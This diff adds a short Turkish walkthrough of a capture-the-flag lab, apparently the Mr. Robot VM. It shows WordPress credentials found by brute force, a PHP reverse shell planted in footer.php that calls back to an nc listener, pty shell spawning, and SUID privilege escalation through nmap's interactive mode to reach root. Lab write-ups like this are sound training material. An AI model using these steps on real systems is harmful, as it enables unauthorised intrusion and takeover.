@@ -1,0 +1,38 @@
+http://10.0.2.7/
+
+dirbuster
+response:200 -> serverdan yanit alindi.
+
+http://10.0.2.7/wp-login/
+Sonrasinda kullanici adi ve password bulmak icin brute force yapacagiz.
+Hydra & WPScan
+
+username: Elliot
+password: ER28-0652
+
+Appearance > Editor > footer.php dosyasini ReverseShell dosyamiz ile degistirdik.
+php cheat sheet: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+		    <php dosyasi icerisindeki ip adresini kali ip'si ile degistir!>
+
+Terminal > nc -nvlp 1234
+Firefox  > http://10.0.2.7/footer.php
+Shell acmayi basardik!
+
+
+Terminale gecis yapmak icin:
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+su robot
+password: abcdefghijklmnopqrstuvwxyz
+
+cat key-2-of-3.txt -> 2.FLAG yakalandi!
+
+
+find / -perm -u=s -type f 2>/dev/null
+nmap --interactive
+!sh
+Root olmayi basardik!
+
+cd root
+cat key-3-of-3.txt -> 3.FLAG yakalandi!
